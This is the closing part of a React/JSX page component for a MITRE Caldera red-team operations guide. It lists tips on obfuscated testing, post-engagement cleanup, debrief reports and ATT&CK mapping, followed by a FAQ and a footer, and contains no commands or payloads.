            <div className="flex gap-3"><CheckCircle className="w-4 h-4 text-green-400 shrink-0 mt-0.5" /><span><strong className="text-foreground">Use obfuscation wisely:</strong> Start with plain-text commands for debugging, then switch to base64 or other obfuscators for realistic testing.</span></div>
          </div>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">POST-ENGAGEMENT</h4>
          <div className="space-y-3 text-sm text-muted-foreground">
            <div className="flex gap-3"><CheckCircle className="w-4 h-4 text-green-400 shrink-0 mt-0.5" /><span><strong className="text-foreground">Clean up:</strong> Remove all agents, backdoors, and artifacts from target systems. Use Caldera's cleanup phase to reverse changes.</span></div>
            <div className="flex gap-3"><CheckCircle className="w-4 h-4 text-green-400 shrink-0 mt-0.5" /><span><strong className="text-foreground">Debrief report:</strong> Use the Debrief plugin to generate operation reports. Include timeline, techniques used, detection gaps, and remediation recommendations.</span></div>
            <div className="flex gap-3"><CheckCircle className="w-4 h-4 text-green-400 shrink-0 mt-0.5" /><span><strong className="text-foreground">ATT&CK mapping:</strong> Use the Compass plugin to generate an ATT&CK Navigator layer showing which techniques were tested and their outcomes.</span></div>
          </div>
        </Section>

        {/* FAQ Section */}
        <div className="mt-8 mb-8">
          <FAQ
            items={calderaFAQItems}
            title="CALDERA TROUBLESHOOTING FAQ"
            description="Common issues and solutions for MITRE Caldera agents, abilities, operations, and server configuration."
          />
        </div>

        {/* Footer */}
        <div className="mt-12 pt-6 border-t border-border text-center text-sm text-muted-foreground">
          <p>Cyber Campaign Command Caldera Operations Guide — AceofCloud</p>
          <p className="mt-1">For the latest Caldera documentation, visit <a href="https://caldera.readthedocs.io" target="_blank" className="text-primary underline">caldera.readthedocs.io</a></p>
        </div>
      </AppShell>
  );
}
